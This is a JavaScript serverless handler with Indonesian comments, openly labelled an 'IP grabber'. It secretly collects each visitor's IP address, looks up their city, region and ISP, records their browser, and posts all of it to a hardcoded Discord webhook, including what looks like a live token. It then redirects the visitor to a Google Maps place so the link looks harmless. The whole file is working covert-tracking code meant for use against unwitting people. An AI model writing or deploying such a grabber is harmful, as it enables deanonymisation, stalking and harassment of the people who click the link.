export default async function handler(req, res) {
    // 1. Ambil IP pengunjung dari header Vercel
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
    const ip = clientIp.includes(',') ? clientIp.split(',')[0].trim() : clientIp;

    try {
        // 2. Ambil data lokasi berdasarkan IP (menggunakan HTTPS agar lebih aman)
        const ipToCheck = (ip === '::1' || ip === '127.0.0.1') ? '114.125.65.1' : ip;
        const response = await fetch(`https://ipapi.co/${ipToCheck}/json/`);
        const data = await response.json();

        const country = data.country_name || data.country || 'Unknown';
        const region = data.region || 'Unknown';
        const city = data.city || 'Unknown';
        const isp = data.org || data.asn || 'Unknown';
        const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Makassar' });
        const userAgent = req.headers['user-agent'] || 'Unknown';

        // 3. Webhook URL Discord Anda
        const discordWebhookUrl = "https://discord.com/api/webhooks/1563194910998401186/0Wff6MGmOXYNdFBs4iD9cupVq_xZCzDUPZaFyJKp2Cy7QkLAlv1uQvcpoK5nvYaPVA-1"; 

        if (discordWebhookUrl) {
            const message = {
                content: `🚨 **IP GRABBER - TARGET TERDETEKSI!** 🚨\n` +
                         `🌐 **IP Address:** \`${ip}\`\n` +
                         `📍 **Lokasi:** ${city}, ${region}, ${country}\n` +
                         `🏢 **ISP/Provider:** ${isp}\n` +
                         `⏰ **Waktu:** ${time}\n` +
                         `💻 **Perangkat:** ${userAgent}`
            };

            // GUNAKAN 'await' agar pengiriman ditunggu sampai selesai sebelum redirect
            await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            });
        }
    } catch (error) {
        console.error("Gagal mengirim data:", error);
    }

    // 4. Redirect pengunjung ke tujuan setelah proses Discord selesai
    res.writeHead(302, { Location: 'https://www.google.com/maps/place/Kec.+Suppa,+Kabupaten+Pinrang,+Sulawesi+Selatan/@-3.9771626,119.5401826,12z/data=!3m1!4b1!4m6!3m5!1s0x2d95babc5965d8b7:0x4030bfbcaf77ae0!8m2!3d-3.9741075!4d119.6093543!16s%2Fg%2F120ktb62?entry=ttu&g_ep=EgoyMDI2MTAxOS4wIKXMDSoASAFQAw%3D%3D' });
    res.end();
}